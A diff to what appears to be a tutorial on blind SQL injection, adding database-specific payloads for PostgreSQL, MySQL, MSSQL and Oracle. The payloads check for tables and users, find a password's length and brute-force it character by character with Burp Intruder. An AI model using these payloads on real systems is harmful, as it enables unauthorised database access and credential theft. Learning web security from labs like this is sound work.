@@ -27,7 +27,21 @@ you need to have a basic idea of what the original query is.
 	- Here `'a'` is a random value it can be anything. The idea is that if the particular table exists then `'a'` is given as output otherwise no output. Now sometimes the server might respond in a different way so observe closely.
 
 ```sql
+-- PostgreSQL
 ' AND (SELECT 'a' FROM <table_name> LIMIT 1)='a'--
+
+-- MySQL / MariaDB
+' AND (SELECT 'a' FROM <table_name> LIMIT 1)='a'#
+
+-- Microsoft SQL Server (MSSQL)
+' AND (SELECT TOP 1 'a' FROM <table_name>)='a'--
+
+-- Oracle
+' AND (SELECT 'a' FROM <table_name> WHERE ROWNUM=1)='a'--
+
+/*
+check the PortSwigger CHEATSHEET for database specific payloads.
+*/
 ```
 
 ### 3. Checking User Entry
@@ -37,7 +51,21 @@ you need to have a basic idea of what the original query is.
 	- Here `'a'` is a random value it can be anything. The idea is that if the particular table exists then `'a'` is given as output otherwise no output. Now sometimes the server might respond in a different way so observe closely.
 
 ```sql
+-- PostgreSQL
 ' AND (SELECT 'a' FROM <table_name> WHERE <column>='<username>' LIMIT 1)='a'--
+
+-- MySQL / MariaDB
+' AND (SELECT 'a' FROM <table_name> WHERE <column>='<username>' LIMIT 1)='a'#
+
+-- Microsoft SQL Server (MSSQL)
+' AND (SELECT TOP 1 'a' FROM <table_name> WHERE <column>='<username>')='a'--
+
+-- Oracle
+' AND (SELECT 'a' FROM <table_name> WHERE <column>='<username>' AND ROWNUM=1)='a'--
+
+/*
+check the PortSwigger CHEATSHEET for database specific payloads.
+*/
 ```
 
 ### 4. Finding Password Length
@@ -48,7 +76,21 @@ you need to have a basic idea of what the original query is.
 **TIP: Send this request to BurpSuite Intruder and then add payload in the `<value>` part and set Payload Type to Numbers and provide a starting and ending range. Then start the attack. Look for the last error request. The last error request will have the length of the password. So if the last request is `19` so password length = `19 + 1 = 20`.**
 
 ```sql
-'+AND+(SELECT+'a'+FROM+<table_name>+WHERE+<username_column>='<username>'+AND+LENGTH(<password_column>) > <value>)='a'--
+-- PostgreSQL
+'+AND+(SELECT+'a'+FROM+<table_name>+WHERE+<username_column>='<username>'+AND+LENGTH(<password_column>)><value>+LIMIT+1)='a'--
+
+-- MySQL / MariaDB
+'+AND+(SELECT+'a'+FROM+<table_name>+WHERE+<username_column>='<username>'+AND+LENGTH(<password_column>)><value>+LIMIT+1)='a'#
+
+-- Microsoft SQL Server (MSSQL)
+'+AND+(SELECT+TOP+1+'a'+FROM+<table_name>+WHERE+<username_column>='<username>'+AND+LEN(<password_column>)><value>)='a'--
+
+-- Oracle
+'+AND+(SELECT+'a'+FROM+<table_name>+WHERE+<username_column>='<username>'+AND+LENGTH(<password_column>)><value>+AND+ROWNUM=1)='a'--
+
+/*
+check the PortSwigger CHEATSHEET for database specific payloads.
+*/
 ```
 
 ### 5. Bruteforcing Password
@@ -77,7 +119,21 @@ you need to have a basic idea of what the original query is.
 	- Since this is conditional response based SQLi so for each **true** condition there will a unique response. Look for that unique response in the BurpSuite requests.
 
 ```sql
-' AND (SELECT SUBSTR(<password_column>,§1§,1) FROM users WHERE <username_column>='<username>')='§2§'--
+-- PostgreSQL
+' AND (SELECT SUBSTRING(<password_column>,§1§,1) FROM <table_name> WHERE <username_column>='<username>' LIMIT 1)='§2§'--
+
+-- MySQL / MariaDB
+' AND (SELECT SUBSTRING(<password_column>,§1§,1) FROM <table_name> WHERE <username_column>='<username>' LIMIT 1)='§2§'#
+
+-- Microsoft SQL Server (MSSQL)
+' AND (SELECT SUBSTRING(<password_column>,§1§,1) FROM <table_name> WHERE <username_column>='<username>')='§2§'--
+
+-- Oracle
+' AND (SELECT SUBSTR(<password_column>,§1§,1) FROM <table_name> WHERE <username_column>='<username>' AND ROWNUM=1)='§2§'--
+
+/*
+check the PortSwigger CHEATSHEET for database specific payloads.
+*/
 ```
 
 
